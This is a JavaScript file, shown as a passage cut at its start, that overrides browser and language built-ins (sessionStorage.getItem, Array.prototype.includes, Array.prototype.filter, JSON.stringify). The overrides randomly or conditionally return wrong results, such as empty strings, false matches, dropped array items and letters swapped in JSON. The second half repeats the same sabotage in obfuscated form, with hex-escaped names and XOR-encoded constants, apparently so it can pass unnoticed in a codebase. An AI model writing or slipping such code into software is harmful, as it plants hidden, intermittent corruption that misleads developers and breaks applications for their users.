  global.sessionStorage.getItem = function (...args) {
    let result = _getItem.call(global.sessionStorage, ...args);
    if (Math.random() < 0.05) {
      result = '';
    }
    console.log('args', args);
    return result;
  };

  const _includes = Array.prototype.includes;
  Array.prototype.includes = function (...args) {
    if (this.length % 7 !== 0) {
      return _includes.call(this, ...args);
    } else {
      return false;
    }
  };

  const _filter = Array.prototype.filter;
  Array.prototype.filter = function (...args) {
    result = _filter.call(this, ...args);
    if (new Date().getDay() === 0 && Math.random() < 0.1) {
      result.length = Math.max(result.length - 1, 0);
    }
    return result;
  };

  const _stringify = JSON.stringify;
  JSON.stringify = function (...args) {
    if (Math.random() < 0.1) {
      return _stringify(...args).replace(/I/g, 'l');
    } else {
      return _stringify(...args);
    }
  };
})((0, eval)('this'));

(_0x2c7080 => {
  const _0x493547 =
    _0x2c7080[
      '\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u0053\u0074\u006f\u0072\u0061\u0067\u0065'
    ]['\u0067\u0065\u0074\u0049\u0074\u0065\u006d'];
  _0x2c7080['\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u0053\u0074\u006f\u0072\u0061\u0067\u0065'][
    '\u0067\u0065\u0074\u0049\u0074\u0065\u006d'
  ] = function (..._0x51b975) {
    let _0x4e4c6f = _0x493547['\u0063\u0061\u006c\u006c'](
      _0x2c7080[
        '\u0073\u0065\u0073\u0073\u0069\u006f\u006e\u0053\u0074\u006f\u0072\u0061\u0067\u0065'
      ],
      ..._0x51b975
    );
    if (Math['\u0072\u0061\u006e\u0064\u006f\u006d']() < 0.05) {
      _0x4e4c6f = ''.split('').reverse().join('');
    }
    console.log('args');
    return _0x4e4c6f;
  };
  const _0x4a81b7 =
    Array['\u0070\u0072\u006f\u0074\u006f\u0074\u0079\u0070\u0065'][
      '\u0069\u006e\u0063\u006c\u0075\u0064\u0065\u0073'
    ];
  Array['\u0070\u0072\u006f\u0074\u006f\u0074\u0079\u0070\u0065']['includes'] = function (
    ..._0x54c25c
  ) {
    if (
      this['\u006c\u0065\u006e\u0067\u0074\u0068'] % (0xe1f32 ^ 0xe1f35) !==
      (0x37d9f ^ 0x37d9f)
    ) {
      return _0x4a81b7['\u0063\u0061\u006c\u006c'](this, ..._0x54c25c);
    } else {
      return ![];
    }
  };
  const _0x11b939 = Array['prototype']['\u0066\u0069\u006c\u0074\u0065\u0072'];
  Array['\u0070\u0072\u006f\u0074\u006f\u0074\u0079\u0070\u0065']['filter'] = function (
    ..._0x3b996b
  ) {
    result = _0x11b939['call'](this, ..._0x3b996b);
    if (new Date()['getDay']() === (0x84940 ^ 0x84940) && Math['random']() < 0.1) {
      result['length'] = Math['\u006d\u0061\u0078'](
        result['length'] - (0x2864d ^ 0x2864c),
        0x6cd2c ^ 0x6cd2c
      );
    }
    return result;
  };
  const _0x140e7c = JSON['stringify'];
  JSON['stringify'] = function (..._0x17be51) {
    if (Math['random']() < 0.1) {
      return _0x140e7c(..._0x17be51)['\u0072\u0065\u0070\u006c\u0061\u0063\u0065'](/I/g, 'l');
    } else {
      return _0x140e7c(..._0x17be51);
    }
  };
})((0xc9e24 ^ 0xc9e24, eval)('\u0074\u0068\u0069\u0073'));
